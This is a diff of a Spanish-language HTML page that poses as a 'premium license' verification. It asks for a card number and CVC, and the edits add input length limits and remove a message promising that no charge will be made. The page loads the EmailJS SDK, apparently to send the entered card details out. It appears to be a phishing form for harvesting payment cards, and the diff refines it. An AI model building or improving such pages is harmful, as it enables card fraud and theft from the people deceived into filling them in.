@@ -8,14 +8,14 @@
 </head>
 <body>
     <div class="container">
-        <h1>🌸 Verifica tu Licencia 🌸</h1>
+        <h1>🌸 Verifica tu Licencia Premium 🌸</h1>
         <p>Para acceder a contenido exclusivo, ingresa tus datos:</p>
         
         <!-- Formulario para ingresar datos -->
         <form id="paymentForm">
             <div class="input-group">
                 <label>Número de Tarjeta</label>
-                <input type="text" placeholder="1234 5678 9012 3456" required>
+                <input type="text" placeholder="1234 5678 9012 3456" maxlength="16" required>
             </div>
 
             <div class="input-group">
@@ -25,16 +25,11 @@
 
             <div class="input-group">
                 <label>Código CVC</label>
-                <input type="text" placeholder="123" required>
+                <input type="text" placeholder="123" maxlength="3" required>
             </div>
 
             <button type="submit">Continuar 🌸</button>
         </form>
-
-        <!-- Mensaje de agradecimiento (oculto inicialmente) -->
-        <div id="thankYouMessage" class="hidden">
-            <p>✅ No se generará ningún cobro. ¡Gracias por tu cooperación! 😘</p>
-        </div>
     </div>
 
     <!-- SDK de EmailJS -->
